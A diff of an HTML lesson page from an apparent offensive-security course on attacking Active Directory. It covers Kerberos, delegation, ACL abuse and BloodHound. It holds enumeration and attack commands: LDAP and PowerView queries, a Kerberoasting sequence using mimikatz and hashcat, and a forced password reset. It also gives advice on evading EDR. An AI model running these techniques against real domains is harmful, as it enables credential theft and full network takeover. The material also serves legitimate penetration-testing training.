@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -135,10 +152,14 @@
             position: relative;
         }
         .ad-node.domain { background: #1a0a0a; border-color: #ff3333; }
+        .ad-node.forest { background: #1a0a1a; border-color: #ff00ff; }
+        .ad-node.trust { background: #0a0a1a; border-color: #5555ff; margin-left: 2rem; }
         .ad-node.ou { background: #0a0a1a; border-color: #5555ff; margin-left: 2rem; }
         .ad-node.user { background: #0a1a0a; border-color: #00ff88; margin-left: 4rem; }
         .ad-node h5 { margin-bottom: 0.5rem; }
         .ad-node.domain h5 { color: #ff3333; }
+        .ad-node.forest h5 { color: #ff00ff; }
+        .ad-node.trust h5 { color: #5555ff; }
         .ad-node.ou h5 { color: #5555ff; }
         .ad-node.user h5 { color: #00ff88; }
         button {
@@ -151,6 +172,185 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .neon-red {
+            color: var(--accent);
+            text-shadow: 0 0 10px var(--accent);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .kerberos-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .krb-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .krb-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .krb-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .ticket-box {
+            background: #0a1a1a;
+            border: 2px solid var(--neon);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .ticket-box h5 { color: var(--neon); margin-bottom: 0.5rem; }
+        .attack-path {
+            background: #1a0a0a;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+        }
+        .attack-path .path-step {
+            color: var(--accent2);
+            margin: 0.3rem 0;
+        }
+        .attack-path .path-arrow {
+            color: var(--accent);
+            margin: 0.2rem 0;
+        }
+        .acl-table td:nth-child(2) {
+            color: var(--amber);
+            font-family: Consolas, monospace;
+        }
+        .acl-table td:nth-child(3) {
+            color: var(--accent2);
+        }
+        .two-col {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        @media (max-width: 768px) {
+            .two-col { grid-template-columns: 1fr; }
+            .kerberos-flow { flex-direction: column; }
+            .krb-arrow { transform: rotate(90deg); }
+        }
     </style>
 </head>
 <body>
@@ -168,253 +368,802 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Active Directory (AD) is not just a directory — it's the <strong>nerve center</strong> of every enterprise Windows network. It stores who you are, what you can do, what computers exist, what groups matter, and what trust relationships bridge domains. Compromise AD, and you don't just own one computer — you own the entire organization. Every account, every server, every secret.</p>
+            <p>Active Directory (AD) is not just a directory — it's the <span class="neon-red">nerve center</span> of every enterprise Windows network. It stores who you are, what you can do, what computers exist, what groups matter, and what trust relationships bridge domains. Compromise AD, and you don't just own one computer — you own the entire organization. Every account, every server, every secret.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> In a typical enterprise, <span class="neon-highlight">95% of the valuable data</span> lives in AD-controlled systems. Email, file shares, databases, source code, customer records — all gated by AD authentication. One Domain Admin credential is the master key to the entire kingdom.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
-            <p>AD is the personnel file cabinet, the building access control, and the communication network — all in one. If you get the master key (Domain Admin), you can open any door, read any file, and impersonate any employee. This module teaches you to map the castle before you storm it.</p>
+            <p>AD is the personnel file cabinet, the building access control, and the communication network — all in one. If you get the master key (Domain Admin), you can open any door, read any file, and impersonate any employee. This module teaches you to map the castle before you storm it, pick the locks with Kerberos, and forge credentials that never expire.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The castle has multiple towers (domains), connected by bridges (trusts). Each tower has guards (ACLs) and secret handshakes (Kerberos). Learn the architecture, and you can walk anywhere.</p>
         </div>
 
-        <h2>The Active Directory Hierarchy</h2>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>DNS, LDAP ports, SMB, and RPC. AD is built on these protocols. You cannot attack what you cannot reach.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a></h4>
+                <p>Local privilege escalation is often the entry point. You escalate from local SYSTEM to domain context.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_15_LATERAL_MOVEMENT.html" class="cross-link">Module 15: Lateral Movement</a></h4>
+                <p>Pass-the-hash, pass-the-ticket, and WMI/PSExec. Moving between machines is lateral movement; AD is the map.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a></h4>
+                <p>Command and control infrastructure. Your beacon needs to communicate; AD credentials let you blend in.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_20_KILL_CHAIN.html" class="cross-link">Module 20: Kill Chain</a></h4>
+                <p>The full attack lifecycle. AD compromise is often the "Actions on Objectives" phase — the endgame.</p>
+            </div>
+        </div>
+
+        <h2>🏰 Section 1: Active Directory Architecture</h2>
+
+        <h3>1.1 The Forest — The Root of Everything</h3>
+        <p>A <span class="neon-highlight">Forest</span> is the top-level container in Active Directory. It represents the complete security boundary for an organization. All domains in a forest share a common schema, global catalog, and transitive trust relationships.</p>
 
         <div class="ad-tree">
+            <div class="ad-node forest">
+                <h5>🌲 FOREST: corp.example.com</h5>
+                <p>The root. Contains one or more domains. Shares a common schema and global catalog. The ultimate security boundary.</p>
+            </div>
             <div class="ad-node domain">
-                <h5>🏰 DOMAIN (e.g., corp.example.com)</h5>
-                <p>The top-level security boundary. Contains all users, computers, and groups. Trusts other domains.</p>
+                <h5>🏰 DOMAIN: corp.example.com (Root Domain)</h5>
+                <p>The top-level security boundary within a forest. Contains all users, computers, and groups. Trusts other domains.</p>
+            </div>
+            <div class="ad-node domain">
+                <h5>🏰 DOMAIN: dev.corp.example.com (Child Domain)</h5>
+                <p>Child domain. Inherits forest-wide settings. Has a two-way transitive trust with the parent.</p>
+            </div>
+            <div class="ad-node trust">
+                <h5>🔗 TRUST: corp.example.com ↔ partner.example.com (External)</h5>
+                <p>External trust between forests. May be one-way or two-way. Selective authentication is rare — usually domain-wide.</p>
             </div>
             <div class="ad-node ou">
-                <h5>📁 ORGANIZATIONAL UNIT (OU)</h5>
-                <p>Container for organizing objects. "Sales", "IT", "Executives". Policies apply at OU level.</p>
+                <h5>📁 ORGANIZATIONAL UNIT (OU): "Sales"</h5>
+                <p>Container for organizing objects. Policies apply at OU level. Not a security boundary — just administration.</p>
             </div>
             <div class="ad-node user">
-                <h5>👤 USER/COMPUTER/GROUP</h5>
-                <p>The actual objects. Users have passwords. Computers have accounts. Groups have memberships.</p>
+                <h5>👤 USER: jsmith</h5>
+                <p>The actual object. Has a SID, password, group memberships, and ACLs. The target.</p>
             </div>
         </div>
 
-        <h2>Method 1: LDAP Reconnaissance</h2>
-
-        <div class="step-box">
-            <h4>Step 1: Enumerate Without Credentials</h4>
-            <p>LDAP (Lightweight Directory Access Protocol) is the query language for AD. Anonymous binding is often enabled — meaning you can query AD without any username or password.</p>
-
-            <div class="code-block">
-=== LDAP ANONYMOUS BIND ===
-# Test if anonymous bind is allowed
-ldapsearch -x -H ldap://dc.corp.example.com -b "dc=corp,dc=example,dc=com" "(objectClass=user)" dn
-
-# If successful, you get a list of all user DNs:
-# dn: CN=Administrator,CN=Users,DC=corp,DC=example,DC=com
-# dn: CN=jsmith,CN=Users,DC=corp,DC=example,DC=com
-# dn: CN=bjohnson,OU=Sales,DC=corp,DC=example,DC=com
-
-=== LDAP QUERY: FIND DOMAIN ADMINS ===
-ldapsearch -x -H ldap://dc.corp.example.com \
-    -b "dc=corp,dc=example,dc=com" \
-    "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=example,DC=com)" \
-    sAMAccountName
-
-# Result: List of all Domain Admin usernames
-            </div>
-
-            <div class="why-box">
-                <h5>Why anonymous bind exists</h5>
-                <p>Some applications need to query AD for user info without authenticating. Directory services, email systems, etc. Administrators often enable anonymous bind for convenience and forget to restrict what anonymous users can see. The default: everything.</p>
-            </div>
+        <div class="why-box">
+            <h5>Why the forest matters</h5>
+            <p>The forest is the <span class="neon-amber">only true security boundary</span> in AD. Domain Admins in one domain can escalate to Enterprise Admins (forest-wide) through SID History abuse or trust exploitation. If you compromise any domain in a forest, you are one step from the entire forest. Never assume a child domain is "safe."</p>
         </div>
 
-        <div class="step-box">
-            <h4>Step 2: Enumerate with Valid Credentials</h4>
-            <p>If you have any valid domain account (even a low-privilege user), you can query AD for valuable information.</p>
-
-            <div class="code-block">
-=== POWERVIEW (PowerShell) ===
-# Import PowerView (part of PowerSploit)
-Import-Module PowerView.ps1
-
-# Get current domain
-Get-NetDomain
-
-# Get all users in domain
-Get-NetUser | Select-Object samaccountname, description, lastlogon
-
-# Get all groups
-Get-NetGroup | Select-Object name, membercount
-
-# Get Domain Admins group members
-Get-NetGroupMember -GroupName "Domain Admins" | Select-Object MemberName
-
-# Get all computers
-Get-NetComputer | Select-Object name, operatingsystem
-
-# Find users with SPN (Kerberoast targets)
-Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
-
-# Find users with "Password Never Expires"
-Get-NetUser -PasswordNeverExpires | Select-Object samaccountname
-            </div>
-
-            <div class="copy-paste">
-Import-Module PowerView.ps1; Get-NetDomain
-            </div>
-
-            <div class="warning-box">
-                <h5>⚠️ PowerView detection</h5>
-                <p>PowerView is a known offensive tool. EDR may flag it. Use obfuscated versions, or write your own LDAP queries using System.DirectoryServices. The queries are the same — the tool is just a wrapper.</p>
-            </div>
-        </div>
-
-        <h2>Method 2: BloodHound — The AD Mapper</h2>
-
-        <div class="step-box">
-            <h4>Step 3: Visualize Attack Paths</h4>
-            <p>BloodHound ingests AD data and shows you the shortest path from your current position to Domain Admin. It's like Google Maps for hacking.</p>
-
-            <div class="code-block">
-=== BLOODHOUND DATA COLLECTION ===
-# Run SharpHound (C# ingestor) on a domain-joined machine
-SharpHound.exe --CollectionMethod All --Domain corp.example.com
-
-# Output: ZIP file with JSON data
-# 20260629123456_BloodHound.zip
-
-=== BLOODHOUND ANALYSIS ===
-# Upload ZIP to BloodHound GUI (Neo4j backend)
-# Click "Analysis" → "Find Shortest Paths to Domain Admin"
-
-# Result: Visual graph showing:
-#   You (User) → MemberOf → GroupA → AdminTo → ComputerB → HasSession → DomainAdmin
-#   Translation: You're in GroupA. GroupA admins ComputerB. DomainAdmin has session on ComputerB.
-#   Attack: Compromise ComputerB, steal DomainAdmin's session/token.
-            </div>
-
-            <div class="why-box">
-                <h5>Why BloodHound is revolutionary</h5>
-                <p>Before BloodHound, AD pentesting was manual: run queries, read output, build mental model. BloodHound automates the mapping and finds paths you would never see. A chain of 5 indirect relationships that leads to Domain Admin — invisible to manual analysis, obvious to graph theory.</p>
-            </div>
-        </div>
-
-        <h2>Method 3: Kerberoasting</h2>
-
-        <div class="step-box">
-            <h4>Step 4: Steal Service Account Passwords</h4>
-            <p>Service accounts (SQL, IIS, etc.) often have SPNs (Service Principal Names). Kerberos tickets for these SPNs are encrypted with the service account's password. Request the ticket, crack it offline.</p>
-
-            <div class="code-block">
-=== KERBEROASTING ===
-# Step 1: Find SPNs (from PowerView)
-Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
-
-# Step 2: Request tickets for all SPNs
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
-    -ArgumentList "MSSQLSvc/sql01.corp.example.com:1433"
-
-# Step 3: Export tickets from memory
-mimikatz # kerberos::list /export
-
-# Step 4: Crack offline with hashcat
-hashcat -m 13100 kerberos_ticket.txt /usr/share/wordlists/rockyou.txt
-
-# Result: If password is weak, you get the service account credentials.
-# Service accounts often have Domain Admin rights (for convenience).
-            </div>
-
-            <div class="warning-box">
-                <h5>⚠️ Why this works</h5>
-                <p>Kerberos tickets are encrypted with the service account's password hash. Anyone can request a ticket for any SPN — no special permissions needed. The ticket is encrypted, but you can take it home and crack it at your leisure. If the password is "Password123", you'll have it in minutes.</p>
-            </div>
-        </div>
-
-        <h2>Lab Exercise: Map a Domain</h2>
-
-        <div class="step-box">
-            <h4>Scenario</h4>
-            <p>You have a low-privilege domain account: "jsmith" / "Password1". Map the domain and find a path to Domain Admin.</p>
-
-            <ol style="margin-left: 1.5rem; line-height: 2;">
-                <li>Run <code>Get-NetDomain</code> — verify domain context</li>
-                <li>Run <code>Get-NetUser</code> — enumerate all users</li>
-                <li>Run <code>Get-NetGroupMember "Domain Admins"</code> — find targets</li>
-                <li>Run <code>Get-NetComputer</code> — find interesting machines</li>
-                <li>Run SharpHound, upload to BloodHound</li>
-                <li>Find shortest path to Domain Admin</li>
-                <li>Document the attack chain</li>
-            </ol>
-
-            <button onclick="document.getElementById('ad-solution').style.display='block'">Show Analysis Method</button>
-
-            <div id="ad-solution" style="display:none; margin-top: 1rem;">
+        <h3>1.2 Domains, Trees, and Trusts</h3>
+        <div class="two-col">
+            <div class="step-box">
+                <h4>Domain Tree</h4>
+                <p>A hierarchy of domains sharing a contiguous DNS namespace:</p>
                 <div class="code-block">
-=== ANALYSIS WORKFLOW ===
+corp.example.com
+├── us.corp.example.com
+│   └── ny.us.corp.example.com
+└── eu.corp.example.com
+    └── uk.eu.corp.example.com</div>
+                <p>All domains in a tree have <span class="neon-highlight">automatic two-way transitive trusts</span>.</p>
+            </div>
+            <div class="step-box">
+                <h4>Trust Types</h4>
+                <table>
+                    <tr><th>Type</th><th>Direction</th><th>Transitive</th></tr>
+                    <tr><td>Parent-Child</td><td>Two-way</td><td>Yes</td></tr>
+                    <tr><td>Tree-Root</td><td>Two-way</td><td>Yes</td></tr>
+                    <tr><td>External</td><td>One or Two-way</td><td>No</td></tr>
+                    <tr><td>Forest</td><td>One or Two-way</td><td>Yes</td></tr>
+                    <tr><td>Shortcut</td><td>One or Two-way</td><td>Yes</td></tr>
+                </table>
+            </div>
+        </div>
 
-1. Verify domain context
-   Get-NetDomain
-   → Domain: corp.example.com
-   → Domain Controller: dc01.corp.example.com
+        <div class="warning-box">
+            <h5>⚠️ Trust Exploitation</h5>
+            <p>External trusts are often created for mergers, partnerships, or vendor access. They are rarely reviewed, frequently overprivileged, and commonly forgotten. An external trust from <code>corp.example.com</code> to <code>acquired.com</code> means: if you own <code>acquired.com</code>, you can attack <code>corp.example.com</code>. <span class="neon-red">Trust is transitive by default.</span> A chain of trusts is a chain of compromise.</p>
+        </div>
 
-2. Enumerate users
-   Get-NetUser | Select-Object samaccountname, description
-   → Administrator (built-in admin)
-   → jsmith (you)
-   → bjohnson (IT staff, description: "SQL admin")
-   → mgarcia (Sales, description: "Password: Summer2024!")
+        <h3>1.3 Key AD Objects</h3>
+        <div class="code-block">
+=== AD OBJECT TYPES ===
 
-3. Find Domain Admins
-   Get-NetGroupMember "Domain Admins"
-   → Administrator
-   → bjohnson
+User        → Person with credentials, SID, group memberships
+Computer    → Machine account with password (rotates every 30 days by default)
+Group       → Collection of users/computers (Domain Admins, Enterprise Admins)
+OU          → Organizational container (not a security principal)
+GPO         → Group Policy Object — settings pushed to OUs
+Domain      → Security boundary (weak — forest is the real boundary)
+Forest      → The top-level container, ultimate security boundary
+Site        → Physical network topology (affects replication)
+Subnet      → IP range associated with a site
 
-4. Find bjohnson's relationships
-   Get-NetUser -Identity bjohnson
-   → MemberOf: SQL_Admins, IT_Staff
-   → AdminTo: SQL01, WEB01
+=== EVERY OBJECT HAS ===
+Distinguished Name (DN)  → CN=jsmith,OU=Sales,DC=corp,DC=example,DC=com
+Security Identifier (SID)→ S-1-5-21-3623811015-3361044348-30300820-1013
+Object GUID              → Globally unique identifier (never changes)
+sAMAccountName           → jsmith (legacy NetBIOS name)
+userPrincipalName        → jsmith@corp.example.com
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
 
-5. BloodHound path
-   jsmith → MemberOf → Sales_Group → GenericAll → mgarcia
-   mgarcia → HasSession → WEB01
-   WEB01 → AdminTo → SQL01
-   SQL01 → HasSession → bjohnson
-   bjohnson → MemberOf → Domain Admins
+        <h2>🔐 Section 2: Kerberos Authentication — The Secret Handshake</h2>
 
-   Attack chain:
-   1. Compromise mgarcia (weak password in description)
-   2. Use mgarcia's session on WEB01
-   3. Escalate from WEB01 to SQL01 (AdminTo)
-   4. Steal bjohnson's session on SQL01
-   5. bjohnson is Domain Admin
+        <h3>2.1 How Kerberos Works</h3>
+        <p>Kerberos is the default authentication protocol in Active Directory. It uses <span class="neon-highlight">symmetric key cryptography</span> and a trusted third party (the Key Distribution Center, or KDC) to prove identity without sending passwords over the network.</p>
+
+        <div class="kerberos-flow">
+            <div class="krb-step">
+                <h5>1. AS-REQ</h5>
+                <p><span class="neon-highlight">User → KDC</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">"I am jsmith. Give me a TGT."</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Encrypted with user's password hash</p>
+            </div>
+            <div class="krb-arrow">→</div>
+            <div class="krb-step">
+                <h5>2. AS-REP</h5>
+                <p><span class="neon-highlight">KDC → User</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">"Here's your TGT."</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Encrypted with krbtgt hash</p>
+            </div>
+            <div class="krb-arrow">→</div>
+            <div class="krb-step">
+                <h5>3. TGS-REQ</h5>
+                <p><span class="neon-highlight">User → KDC</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">"I want to access SQL01."</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Presents TGT + authenticator</p>
+            </div>
+            <div class="krb-arrow">→</div>
+            <div class="krb-step">
+                <h5>4. TGS-REP</h5>
+                <p><span class="neon-highlight">KDC → User</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">"Here's your service ticket."</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Encrypted with service hash</p>
+            </div>
+            <div class="krb-arrow">→</div>
+            <div class="krb-step">
+                <h5>5. AP-REQ</h5>
+                <p><span class="neon-highlight">User → Service</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">"Let me in."</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Presents service ticket</p>
+            </div>
+        </div>
+
+        <div class="ticket-box">
+            <h5>🎫 Ticket Granting Ticket (TGT)</h5>
+            <p>The TGT is your <span class="neon-amber">master ticket</span>. Once you have it, you can request service tickets for any service in the domain without re-entering your password. The TGT is encrypted with the <span class="neon-red">krbtgt account's password hash</span> — a special account that exists only to encrypt TGTs. If you know the krbtgt hash, you can forge TGTs for anyone. This is the <span class="neon-highlight">Golden Ticket</span>.</p>
+        </div>
+
+        <div class="ticket-box">
+            <h5>🎫 Ticket Granting Service (TGS) / Service Ticket</h5>
+            <p>The TGS is your <span class="neon-amber">entry pass to a specific service</span>. It is encrypted with the <span class="neon-red">service account's password hash</span>. If you request a TGS for a service with an SPN, the ticket is encrypted with that service account's hash. You can take this ticket offline and crack it. This is <span class="neon-highlight">Kerberoasting</span>.</p>
+        </div>
+
+        <h3>2.2 SPN — Service Principal Names</h3>
+        <p>An <span class="neon-highlight">SPN</span> is a unique identifier for a service instance. It associates a service with a domain account. When Kerberos authenticates to a service, it uses the SPN to find the account and encrypt the ticket.</p>
+
+        <div class="code-block">
+=== SPN FORMATS ===
+
+serviceclass/host:port/servicename
+
+MSSQLSvc/sql01.corp.example.com:1433       → SQL Server on SQL01
+HTTP/web01.corp.example.com                → IIS on WEB01
+CIFS/fs01.corp.example.com                 → File share on FS01
+LDAP/dc01.corp.example.com                 → Domain Controller LDAP
+HOST/workstation01.corp.example.com        → Computer account (default)
+
+=== WHY SPNs MATTER ===
+Every SPN is tied to a domain account. When you request a ticket for an SPN,
+that ticket is encrypted with the account's password hash. If the account has a
+weak password, you can crack the ticket offline and recover the credential.
+
+Service accounts often have:
+- Passwords that never expire
+- Weak passwords (set once, never changed)
+- Domain Admin or high privileges (for "convenience")
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <h3>2.3 Kerberos Delegation</h3>
+        <p><span class="neon-highlight">Delegation</span> allows a service to impersonate a user to access another service. It's designed for multi-tier applications (web server → database server). For attackers, it's a privilege escalation path.</p>
+
+        <div class="two-col">
+            <div class="step-box">
+                <h4>Unconstrained Delegation</h4>
+                <p>The service can impersonate the user to <span class="neon-red">ANY service</span> on <span class="neon-red">ANY computer</span>. If a Domain Admin authenticates to a server with unconstrained delegation, the server caches the user's TGT. Compromise the server, steal the TGT, become Domain Admin.</p>
+                <div class="code-block" style="margin-top:1rem">
+# Find computers with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+            <div class="step-box">
+                <h4>Constrained Delegation</h4>
+                <p>The service can only impersonate the user to <span class="neon-highlight">specific services</span>. More secure, but still exploitable. If you compromise the service account, you can request service tickets for the allowed SPNs — potentially as any user.</p>
+                <div class="code-block" style="margin-top:1rem">
+# Find accounts with constrained delegation
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne $null}
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                 </div>
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <div class="warning-box">
+            <h5>⚠️ Resource-Based Constrained Delegation (RBCD)</h5>
+            <p>RBCD flips the model: the <span class="neon-amber">resource</span> (target) decides who can delegate to it. If you have GenericAll or GenericWrite on a computer object, you can set its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute to a service account you control. Then request a ticket as any user to that computer. <span class="neon-red">This is a common escalation path from computer account takeover to full domain compromise.</span></p>
+        </div>
+
+        <h2>🛡️ Section 3: Access Control Lists (ACLs)</h2>
+
+        <h3>3.1 How ACLs Work in AD</h3>
+        <p>Every object in Active Directory has a <span class="neon-highlight">Discretionary Access Control List (DACL)</span> that defines who can do what to it. ACLs are the <span class="neon-amber">permission grid</span> of the domain. Misconfigured ACLs create attack paths that BloodHound visualizes.</p>
+
+        <div class="code-block">
+=== COMMON AD ACL PERMISSIONS ===
+
+GenericAll        → Full control (read, write, modify, delete)
+GenericWrite      → Modify attributes (can set SPN, logon script, etc.)
+WriteDACL         → Modify permissions (grant yourself GenericAll)
+WriteOwner        → Change owner (then modify DACL as owner)
+Self              → Self-modification (e.g., add yourself to group)
+AllExtendedRights → Extended rights (ForceChangePassword, etc.)
+ForceChangePassword → Reset user's password without knowing old one
+AddMember         → Add members to a group
+
+=== ATTACK: ForceChangePassword ===
+# If you have GenericAll or AllExtendedRights on a user:
+$SecurePassword = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
+Set-ADAccountPassword -Identity victim -NewPassword $SecurePassword
+
+# Now log in as victim and continue the attack chain.
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <h3>3.2 ACL Attack Paths</h3>
+        <div class="attack-path">
+            <h4 style="color: var(--accent); margin-bottom: 1rem;">Example Attack Chain via ACL Abuse</h4>
+            <div class="path-step">You (jsmith) → MemberOf → Sales_Group</div>
+            <div class="path-arrow">↓</div>
+            <div class="path-step">Sales_Group → GenericAll → mgarcia (user)</div>
+            <div class="path-arrow">↓</div>
+            <div class="path-step">mgarcia → MemberOf → IT_Support</div>
+            <div class="path-arrow">↓</div>
+            <div class="path-step">IT_Support → GenericAll → WEB01$ (computer)</div>
+            <div class="path-arrow">↓</div>
+            <div class="path-step">WEB01$ → HasSession → bjohnson</div>
+            <div class="path-arrow">↓</div>
+            <div class="path-step">bjohnson → MemberOf → Domain Admins</div>
+            <div class="path-arrow" style="color: var(--accent2);">✅ DOMAIN ADMIN</div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why ACL abuse is invisible</h5>
+            <p>ACL modifications are logged in the Security event log (Event ID 5136), but in a typical enterprise, these logs are never reviewed. The attack doesn't involve malware, doesn't trigger AV, and doesn't create network anomalies. It's just LDAP queries and password resets — indistinguishable from legitimate administration. <span class="neon-highlight">BloodHound exists because humans cannot manually trace these chains.</span></p>
+        </div>
+
+        <h2>🗺️ Section 4: BloodHound & SharpHound — The AD Mapper</h2>
+
+        <h3>4.1 What BloodHound Does</h3>
+        <p>BloodHound ingests Active Directory data and builds a <span class="neon-highlight">graph database</span> (Neo4j) of all objects and their relationships. It then runs graph algorithms to find the shortest path from any starting point to high-value targets like Domain Admin.</p>
+
+        <div class="code-block">
+=== SHARPHOUND DATA COLLECTION ===
+
+# Run SharpHound (C# ingestor) on a domain-joined machine
+SharpHound.exe --CollectionMethod All --Domain corp.example.com
+
+# Collection methods:
+#   Default    → Group membership, local admin, session info
+#   All        → Everything (ACLs, trusts, properties, containers)
+#   DCOnly     → Only from DC (no network touch — stealthy)
+#   Session    → Active sessions (requires admin on target)
+#   ACL        → Access control lists (slow but comprehensive)
+#   Trusts     → Domain/forest trust relationships
+#   GPOLocalGroup → Group Policy-derived local group memberships
+
+# Output: ZIP file with JSON data
+#   20260629123456_BloodHound.zip
+
+# Upload ZIP to BloodHound GUI (Neo4j backend)
+# Click "Analysis" → "Find Shortest Paths to Domain Admin"
+
+# Pre-built queries:
+#   Shortest Path to Domain Admin
+#   Shortest Path to Enterprise Admin
+#   Kerberoastable users with most privileges
